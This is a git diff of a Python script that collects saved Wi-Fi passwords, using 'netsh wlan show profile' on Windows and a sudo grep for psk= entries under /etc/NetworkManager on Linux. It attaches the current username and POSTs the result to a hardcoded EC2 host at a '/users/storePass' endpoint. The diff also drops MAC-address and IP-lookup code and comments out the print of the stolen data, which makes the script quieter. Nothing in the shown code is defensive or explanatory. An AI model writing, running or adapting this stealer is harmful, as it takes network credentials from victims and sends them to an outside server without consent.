@@ -1,17 +1,13 @@
-import os
 import re
 import subprocess
-import uuid
 import sys
 import requests
+import getpass
 
-MAC = ''
 OS = ''
 COMMAND_WINDOWS = "netsh wlan show profile"
 COMMAND_LINUX = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
 RE_LINUX = '/etc/NetworkManager/system-connections/(.*)'
-URL = 'http://ipinfo.io/json'
-
 
 def main():
     identify()
@@ -19,8 +15,7 @@ def main():
 
 
 def identify():
-    global MAC, OS
-    MAC = str((hex(uuid.getnode())))
+    global OS
     OS = sys.platform
 
 
@@ -69,23 +64,14 @@ def get_passwords():
                 pass
 
     dataToBeSent["passwords"] = dataList
-    dataToBeSent["user"]=os.getenv('username')
+    dataToBeSent["user"]=getpass.getuser()
     return dataToBeSent
-
 
 def send():
     url = "http://ec2-3-83-115-206.compute-1.amazonaws.com:3000/users/storePass"
     jsonData = get_passwords()
-    # data = json.dumps(jsonData)
-    print(jsonData)
+    #print(jsonData)
     r = requests.post(url=url, json=jsonData)
-    # print(json.loads(data))
-
-
-def get_file_size(file_name):
-    path = os.path.dirname(os.path.realpath(file_name))
-    return os.path.getsize(path + "/" + file_name)
-
 
 if __name__ == "__main__":
     main()
